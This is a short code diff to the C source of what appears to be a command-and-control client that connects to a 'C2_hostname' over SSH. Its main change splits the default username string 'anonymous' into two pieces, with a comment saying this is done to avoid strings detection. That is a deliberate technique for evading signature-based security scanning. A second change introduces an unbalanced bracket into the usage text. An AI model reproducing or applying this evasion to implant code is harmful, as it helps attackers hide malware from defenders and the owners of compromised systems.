@@ -40,7 +40,7 @@ void Sleep(int milliseconds) {
 #endif
 
 void help(char* self) {
-    debug("Usage: %s [user@]C2_hostname [LOCAL_SSH_SERVER_PORT]\n", self);
+    debug("Usage: %s [user@C2_hostname [LOCAL_SSH_SERVER_PORT]\n", self);
     debug("Example: %s user@C2_hostname\n", self);
     debug("Example: %s user@C2_hostname 1234\n", self);  
     debug("Example: %s hostname\n", self);
@@ -67,7 +67,8 @@ void parse_args(int argc, char** argv,
     }
     else {
         *C2_host = argv[1];
-        strncpy(username, "anonymous", 100); // default user
+        strncat(username, "anon", 100); // default user, splitted to avoid strings detection
+        strncat(username, "ymous", 100);
     }
 
     if (argc == 3) {
